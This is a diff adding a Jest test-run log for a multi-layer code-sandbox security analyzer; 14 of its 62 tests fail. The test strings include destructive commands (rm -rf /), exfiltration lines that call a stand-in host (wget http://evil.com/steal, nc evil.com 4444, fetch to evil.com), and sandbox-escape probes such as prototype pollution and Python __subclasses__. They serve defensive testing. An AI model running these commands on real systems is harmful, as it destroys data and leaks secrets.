@@ -1,0 +1,393 @@
+﻿node : (node:27208) ExperimentalWarning: VM Modules is an experimental feature 
+and might change at any time
+At line:1 char:1
++ node --experimental-vm-modules node_modules/jest/bin/jest.js tests/sa ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: ((node:27208) Ex...nge at any time 
+   :String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+ 
+(Use `node --trace-warnings ...` to show where the warning was created)
+FAIL tests/sandbox_security.test.js (7.749 s)
+  Layer 1: Dangerous Commands
+    ΓêÜ should block rm -rf / (25 ms)
+    ΓêÜ should block rm -rf ~ (5 ms)
+    ΓêÜ should block shutdown command (7 ms)
+    ΓêÜ should block format command (5 ms)
+    ΓêÜ should block dd command (7 ms)
+    ΓêÜ should block kill -9 1 (init) (4 ms)
+  Layer 2: Dangerous Imports
+    ├ù should block require("child_process") (13 ms)
+    ΓêÜ should block require("fs") (4 ms)
+    ΓêÜ should block require("net") (4 ms)
+    ΓêÜ should block Python import os (4 ms)
+    ├ù should block Python import subprocess (4 ms)
+    ΓêÜ should block Python __import__("os") (4 ms)
+    ΓêÜ should block Java Runtime import (4 ms)
+    ΓêÜ should block C unistd.h (3 ms)
+    ΓêÜ should block C socket.h (3 ms)
+    ΓêÜ should block Rust std::process::Command (5 ms)
+  Layer 3: Code Injection Patterns
+    ├ù should block eval() (5 ms)
+    ├ù should block new Function() (3 ms)
+    ├ù should block process.exit (5 ms)
+    ├ù should block process.env access (5 ms)
+    ├ù should block while(true) infinite loop (4 ms)
+    ├ù should block for(;;) infinite loop (4 ms)
+    ├ù should block fs.readFile (5 ms)
+    ΓêÜ should block fs.writeFile (16 ms)
+    ├ù should block fetch() (4 ms)
+    ├ù should block Python __subclasses__ (3 ms)
+    ΓêÜ should block C system() call (3 ms)
+    ΓêÜ should block C fork() (3 ms)
+    ΓêÜ should block Go exec.Command (3 ms)
+    ΓêÜ should block Go os.Remove (2 ms)
+    ΓêÜ should block Java Runtime.exec (2 ms)
+    ├ù should block __proto__ pollution (3 ms)
+  Layer 4: Data Exfiltration
+    ΓêÜ should block curl exfiltration (3 ms)
+    ├ù should block wget exfiltration (3 ms)
+    ├ù should block nc (netcat) exfiltration (3 ms)
+  Safe Code ΓÇö Should Pass All Layers
+    ΓêÜ should allow simple Python print (2 ms)
+    ΓêÜ should allow Python math operations (3 ms)
+    ΓêÜ should allow Python list comprehension (2 ms)
+    ΓêÜ should allow simple JavaScript console.log (2 ms)
+    ΓêÜ should allow JavaScript math (2 ms)
+    ΓêÜ should allow simple C printf (2 ms)
+    ΓêÜ should allow simple C++ cout (2 ms)
+    ΓêÜ should allow simple Java HelloWorld (3 ms)
+    ΓêÜ should allow Go simple print (3 ms)
+    ΓêÜ should allow Rust simple print (3 ms)
+  Policy Engine
+    ΓêÜ should assign correct trust levels (3 ms)
+    ΓêÜ should enforce rate limits (5 ms)
+    ΓêÜ should block oversized code (5 ms)
+    ΓêÜ should cap timeout based on trust level (5 ms)
+    ΓêÜ should allow trusted agent with reasonable timeout (3 ms)
+    ΓêÜ should restrict untrusted agents to python/javascript only (3 ms)
+    ΓêÜ should compute consistent code hash (4 ms)
+  Trust Configuration
+    ΓêÜ UNTRUSTED should have strictest limits (4 ms)
+    ΓêÜ PRIVILEGED should have highest limits (3 ms)
+  Supported Languages
+    ΓêÜ should support all expected languages (5 ms)
+  Integration: In-Process Sandbox Execution
+    ΓêÜ should execute simple Python code (151 ms)
+    ΓêÜ should execute simple JavaScript code (173 ms)
+    ΓêÜ should block dangerous code execution (21 ms)
+    ΓêÜ should handle timeout (5062 ms)
+    ΓêÜ should handle compile errors gracefully (153 ms)
+    ΓêÜ should auto-detect Python language (93 ms)
+    ΓêÜ should auto-detect JavaScript language (132 ms)
+
+  ΓùÅ Layer 2: Dangerous Imports ΓÇ║ should block require("child_process")
+
+    expect(received).toBe(expected) // Object.is equality
+
+    Expected: 1
+    Received: 2
+
+    [0m [90m 76 |[39m     
+expect(result[33m.[39msafe)[33m.[39mtoBe([36mfalse[39m)[33m;[39m
+     [90m 77 |[39m     [90m// child_process matches Layer 1 
+(DANGEROUS_COMMANDS) before Layer 2[39m
+    [31m[1m>[22m[39m[90m 78 |[39m     
+expect(result[33m.[39mlayer)[33m.[39mtoBe([35m1[39m)[33m;[39m
+     [90m    |[39m                          [31m[1m^[22m[39m
+     [90m 79 |[39m   })[33m;[39m
+     [90m 80 |[39m
+     [90m 81 |[39m   test([32m'should block require("fs")'[39m[33m,[39m 
+() [33m=>[39m {[0m
+
+      at Object.<anonymous> (tests/sandbox_security.test.js:78:26)
+
+  ΓùÅ Layer 2: Dangerous Imports ΓÇ║ should block Python import subprocess
+
+    expect(received).toBe(expected) // Object.is equality
+
+    Expected: 1
+    Received: 2
+
+    [0m [90m 101 |[39m     
+expect(result[33m.[39msafe)[33m.[39mtoBe([36mfalse[39m)[33m;[39m
+     [90m 102 |[39m     [90m// subprocess matches Layer 1 
+(DANGEROUS_COMMANDS) before Layer 2[39m
+    [31m[1m>[22m[39m[90m 103 |[39m     
+expect(result[33m.[39mlayer)[33m.[39mtoBe([35m1[39m)[33m;[39m
+     [90m     |[39m                          [31m[1m^[22m[39m
+     [90m 104 |[39m   })[33m;[39m
+     [90m 105 |[39m
+     [90m 106 |[39m   test([32m'should block Python 
+__import__("os")'[39m[33m,[39m () [33m=>[39m {[0m
+
+      at Object.<anonymous> (tests/sandbox_security.test.js:103:26)
+
+  ΓùÅ Layer 3: Code Injection Patterns ΓÇ║ should block eval()
+
+    expect(received).toBe(expected) // Object.is equality
+
+    Expected: 1
+    Received: 3
+
+    [0m [90m 143 |[39m     [36mconst[39m result [33m=[39m 
+analyzeCodeSecurity([32m'eval("console.log(1)")'[39m)[33m;[39m
+     [90m 144 |[39m     
+expect(result[33m.[39msafe)[33m.[39mtoBe([36mfalse[39m)[33m;[39m
+    [31m[1m>[22m[39m[90m 145 |[39m     
+expect(result[33m.[39mlayer)[33m.[39mtoBe([35m1[39m)[33m;[39m  [90m// 
+DANGEROUS_COMMANDS[39m
+     [90m     |[39m                          [31m[1m^[22m[39m
+     [90m 146 |[39m   })[33m;[39m
+     [90m 147 |[39m
+     [90m 148 |[39m   test([32m'should block new 
+Function()'[39m[33m,[39m () [33m=>[39m {[0m
+
+      at Object.<anonymous> (tests/sandbox_security.test.js:145:26)
+
+  ΓùÅ Layer 3: Code Injection Patterns ΓÇ║ should block new Function()
+
+    expect(received).toBe(expected) // Object.is equality
+
+    Expected: 1
+    Received: 3
+
+    [0m [90m 149 |[39m     [36mconst[39m result [33m=[39m 
+analyzeCodeSecurity([32m'new Function("return 1")'[39m)[33m;[39m
+     [90m 150 |[39m     
+expect(result[33m.[39msafe)[33m.[39mtoBe([36mfalse[39m)[33m;[39m
+    [31m[1m>[22m[39m[90m 151 |[39m     
+expect(result[33m.[39mlayer)[33m.[39mtoBe([35m1[39m)[33m;[39m  [90m// 
+DANGEROUS_COMMANDS[39m
+     [90m     |[39m                          [31m[1m^[22m[39m
+     [90m 152 |[39m   })[33m;[39m
+     [90m 153 |[39m
+     [90m 154 |[39m   test([32m'should block process.exit'[39m[33m,[39m 
+() [33m=>[39m {[0m
+
+      at Object.<anonymous> (tests/sandbox_security.test.js:151:26)
+
+  ΓùÅ Layer 3: Code Injection Patterns ΓÇ║ should block process.exit
+
+    expect(received).toBe(expected) // Object.is equality
+
+    Expected: 1
+    Received: 3
+
+    [0m [90m 155 |[39m     [36mconst[39m result [33m=[39m 
+analyzeCodeSecurity([32m'process.exit(1);'[39m)[33m;[39m
+     [90m 156 |[39m     
+expect(result[33m.[39msafe)[33m.[39mtoBe([36mfalse[39m)[33m;[39m
+    [31m[1m>[22m[39m[90m 157 |[39m     
+expect(result[33m.[39mlayer)[33m.[39mtoBe([35m1[39m)[33m;[39m  [90m// 
+DANGEROUS_COMMANDS[39m
+     [90m     |[39m                          [31m[1m^[22m[39m
+     [90m 158 |[39m   })[33m;[39m
+     [90m 159 |[39m
+     [90m 160 |[39m   test([32m'should block process.env 
+access'[39m[33m,[39m () [33m=>[39m {[0m
+
+      at Object.<anonymous> (tests/sandbox_security.test.js:157:26)
+
+  ΓùÅ Layer 3: Code Injection Patterns ΓÇ║ should block process.env access
+
+    expect(received).toBe(expected) // Object.is equality
+
+    Expected: 1
+    Received: 3
+
+    [0m [90m 161 |[39m     [36mconst[39m result [33m=[39m 
+analyzeCodeSecurity([32m'console.log(process.env);'[39m)[33m;[39m
+     [90m 162 |[39m     
+expect(result[33m.[39msafe)[33m.[39mtoBe([36mfalse[39m)[33m;[39m
+    [31m[1m>[22m[39m[90m 163 |[39m     
+expect(result[33m.[39mlayer)[33m.[39mtoBe([35m1[39m)[33m;[39m  [90m// 
+DANGEROUS_COMMANDS[39m
+     [90m     |[39m                          [31m[1m^[22m[39m
+     [90m 164 |[39m   })[33m;[39m
+     [90m 165 |[39m
+     [90m 166 |[39m   test([32m'should block while(true) infinite 
+loop'[39m[33m,[39m () [33m=>[39m {[0m
+
+      at Object.<anonymous> (tests/sandbox_security.test.js:163:26)
+
+  ΓùÅ Layer 3: Code Injection Patterns ΓÇ║ should block while(true) infinite 
+loop
+
+    expect(received).toBe(expected) // Object.is equality
+
+    Expected: 1
+    Received: 3
+
+    [0m [90m 167 |[39m     [36mconst[39m result [33m=[39m 
+analyzeCodeSecurity([32m'while(true){}'[39m)[33m;[39m
+     [90m 168 |[39m     
+expect(result[33m.[39msafe)[33m.[39mtoBe([36mfalse[39m)[33m;[39m
+    [31m[1m>[22m[39m[90m 169 |[39m     
+expect(result[33m.[39mlayer)[33m.[39mtoBe([35m1[39m)[33m;[39m  [90m// 
+DANGEROUS_COMMANDS[39m
+     [90m     |[39m                          [31m[1m^[22m[39m
+     [90m 170 |[39m   })[33m;[39m
+     [90m 171 |[39m
+     [90m 172 |[39m   test([32m'should block for(;;) infinite 
+loop'[39m[33m,[39m () [33m=>[39m {[0m
+
+      at Object.<anonymous> (tests/sandbox_security.test.js:169:26)
+
+  ΓùÅ Layer 3: Code Injection Patterns ΓÇ║ should block for(;;) infinite loop
+
+    expect(received).toBe(expected) // Object.is equality
+
+    Expected: 1
+    Received: 3
+
+    [0m [90m 173 |[39m     [36mconst[39m result [33m=[39m 
+analyzeCodeSecurity([32m'for(;;){}'[39m)[33m;[39m
+     [90m 174 |[39m     
+expect(result[33m.[39msafe)[33m.[39mtoBe([36mfalse[39m)[33m;[39m
+    [31m[1m>[22m[39m[90m 175 |[39m     
+expect(result[33m.[39mlayer)[33m.[39mtoBe([35m1[39m)[33m;[39m  [90m// 
+DANGEROUS_COMMANDS[39m
+     [90m     |[39m                          [31m[1m^[22m[39m
+     [90m 176 |[39m   })[33m;[39m
+     [90m 177 |[39m
+     [90m 178 |[39m   test([32m'should block fs.readFile'[39m[33m,[39m 
+() [33m=>[39m {[0m
+
+      at Object.<anonymous> (tests/sandbox_security.test.js:175:26)
+
+  ΓùÅ Layer 3: Code Injection Patterns ΓÇ║ should block fs.readFile
+
+    expect(received).toBe(expected) // Object.is equality
+
+    Expected: 1
+    Received: 3
+
+    [0m [90m 180 |[39m     
+expect(result[33m.[39msafe)[33m.[39mtoBe([36mfalse[39m)[33m;[39m
+     [90m 181 |[39m     [90m// fs.readFile matches Layer 1 
+(DANGEROUS_COMMANDS)[39m
+    [31m[1m>[22m[39m[90m 182 |[39m     
+expect(result[33m.[39mlayer)[33m.[39mtoBe([35m1[39m)[33m;[39m
+     [90m     |[39m                          [31m[1m^[22m[39m
+     [90m 183 |[39m   })[33m;[39m
+     [90m 184 |[39m
+     [90m 185 |[39m   test([32m'should block fs.writeFile'[39m[33m,[39m 
+() [33m=>[39m {[0m
+
+      at Object.<anonymous> (tests/sandbox_security.test.js:182:26)
+
+  ΓùÅ Layer 3: Code Injection Patterns ΓÇ║ should block fetch()
+
+    expect(received).toBe(expected) // Object.is equality
+
+    Expected: 1
+    Received: 3
+
+    [0m [90m 194 |[39m     [36mconst[39m result [33m=[39m 
+analyzeCodeSecurity([32m'fetch("http://evil.com")'[39m)[33m;[39m
+     [90m 195 |[39m     
+expect(result[33m.[39msafe)[33m.[39mtoBe([36mfalse[39m)[33m;[39m
+    [31m[1m>[22m[39m[90m 196 |[39m     
+expect(result[33m.[39mlayer)[33m.[39mtoBe([35m1[39m)[33m;[39m  [90m// 
+DANGEROUS_COMMANDS[39m
+     [90m     |[39m                          [31m[1m^[22m[39m
+     [90m 197 |[39m   })[33m;[39m
+     [90m 198 |[39m
+     [90m 199 |[39m   test([32m'should block Python 
+__subclasses__'[39m[33m,[39m () [33m=>[39m {[0m
+
+      at Object.<anonymous> (tests/sandbox_security.test.js:196:26)
+
+  ΓùÅ Layer 3: Code Injection Patterns ΓÇ║ should block Python __subclasses__
+
+    expect(received).toBe(expected) // Object.is equality
+
+    Expected: 1
+    Received: 3
+
+    [0m [90m 200 |[39m     [36mconst[39m result [33m=[39m 
+analyzeCodeSecurity([32m'().__class__.__subclasses__()'[39m)[33m;[39m
+     [90m 201 |[39m     
+expect(result[33m.[39msafe)[33m.[39mtoBe([36mfalse[39m)[33m;[39m
+    [31m[1m>[22m[39m[90m 202 |[39m     
+expect(result[33m.[39mlayer)[33m.[39mtoBe([35m1[39m)[33m;[39m  [90m// 
+DANGEROUS_COMMANDS[39m
+     [90m     |[39m                          [31m[1m^[22m[39m
+     [90m 203 |[39m   })[33m;[39m
+     [90m 204 |[39m
+     [90m 205 |[39m   test([32m'should block C system() 
+call'[39m[33m,[39m () [33m=>[39m {[0m
+
+      at Object.<anonymous> (tests/sandbox_security.test.js:202:26)
+
+  ΓùÅ Layer 3: Code Injection Patterns ΓÇ║ should block __proto__ pollution
+
+    expect(received).toBe(expected) // Object.is equality
+
+    Expected: 1
+    Received: 3
+
+    [0m [90m 239 |[39m     [36mconst[39m result [33m=[39m 
+analyzeCodeSecurity([32m'obj.__proto__ = malicious;'[39m)[33m;[39m
+     [90m 240 |[39m     
+expect(result[33m.[39msafe)[33m.[39mtoBe([36mfalse[39m)[33m;[39m
+    [31m[1m>[22m[39m[90m 241 |[39m     
+expect(result[33m.[39mlayer)[33m.[39mtoBe([35m1[39m)[33m;[39m  [90m// 
+DANGEROUS_COMMANDS[39m
+     [90m     |[39m                          [31m[1m^[22m[39m
+     [90m 242 |[39m   })[33m;[39m
+     [90m 243 |[39m })[33m;[39m
+     [90m 244 |[39m[0m
+
+      at Object.<anonymous> (tests/sandbox_security.test.js:241:26)
+
+  ΓùÅ Layer 4: Data Exfiltration ΓÇ║ should block wget exfiltration
+
+    expect(received).toBe(expected) // Object.is equality
+
+    Expected: false
+    Received: true
+
+    [0m [90m 258 |[39m   test([32m'should block wget 
+exfiltration'[39m[33m,[39m () [33m=>[39m {
+     [90m 259 |[39m     [36mconst[39m result [33m=[39m 
+analyzeCodeSecurity([32m'wget http://evil.com/steal'[39m)[33m;[39m
+    [31m[1m>[22m[39m[90m 260 |[39m     
+expect(result[33m.[39msafe)[33m.[39mtoBe([36mfalse[39m)[33m;[39m
+     [90m     |[39m                         [31m[1m^[22m[39m
+     [90m 261 |[39m     
+expect(result[33m.[39mlayer)[33m.[39mtoBe([35m4[39m)[33m;[39m  [90m// 
+EXFILTRATION_PATTERNS[39m
+     [90m 262 |[39m   })[33m;[39m
+     [90m 263 |[39m[0m
+
+      at Object.<anonymous> (tests/sandbox_security.test.js:260:25)
+
+  ΓùÅ Layer 4: Data Exfiltration ΓÇ║ should block nc (netcat) exfiltration
+
+    expect(received).toBe(expected) // Object.is equality
+
+    Expected: false
+    Received: true
+
+    [0m [90m 264 |[39m   test([32m'should block nc (netcat) 
+exfiltration'[39m[33m,[39m () [33m=>[39m {
+     [90m 265 |[39m     [36mconst[39m result [33m=[39m 
+analyzeCodeSecurity([32m'nc evil.com 4444'[39m)[33m;[39m
+    [31m[1m>[22m[39m[90m 266 |[39m     
+expect(result[33m.[39msafe)[33m.[39mtoBe([36mfalse[39m)[33m;[39m
+     [90m     |[39m                         [31m[1m^[22m[39m
+     [90m 267 |[39m     
+expect(result[33m.[39mlayer)[33m.[39mtoBe([35m4[39m)[33m;[39m  [90m// 
+EXFILTRATION_PATTERNS[39m
+     [90m 268 |[39m   })[33m;[39m
+     [90m 269 |[39m })[33m;[39m[0m
+
+      at Object.<anonymous> (tests/sandbox_security.test.js:266:25)
+
+Test Suites: 1 failed, 1 total
+Tests:       14 failed, 48 passed, 62 total
+Snapshots:   0 total
+Time:        7.935 s
+Ran all test suites matching /tests\\sandbox_security.test.js/i.
